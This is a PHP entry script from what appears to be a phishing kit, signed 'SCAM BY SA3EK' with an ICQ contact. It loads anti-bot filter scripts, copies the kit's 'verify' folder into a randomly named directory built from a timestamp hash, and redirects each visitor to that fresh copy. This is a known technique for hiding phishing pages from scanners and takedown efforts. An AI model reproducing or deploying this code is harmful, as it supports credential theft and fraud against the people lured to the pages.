<?php
	error_reporting(E_ERROR | E_PARSE);
	include('verify/antibots/bot.php');
    include('verify/antibots/checkbots.php');
	include('verify/antibots/perfect.php');
	$date = new DateTime("NOW");
	$FOL = md5($date->format( "m-d-Y H:i:s.u"));
/******
SCAM BY SA3EK
ICQ : 740900705
*******/
	//PATH OF THE FOLDER
	$YSS="verify";
	xysrecurse_copyx($YSS, $FOL);
	header("location: $FOL");
	
	function xysrecurse_copyx($YSS,$FOL) {
		$dir = opendir($YSS);
		@mkdir($FOL);
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) {
				if ( is_dir($YSS . '/' . $file) ) {
				xysrecurse_copyx($YSS . '/' . $file,$FOL . '/' . $file);
				}
				else {
				copy($YSS . '/' . $file,$FOL . '/' . $file);
				}
			}
		}
		closedir($dir);
	}
?>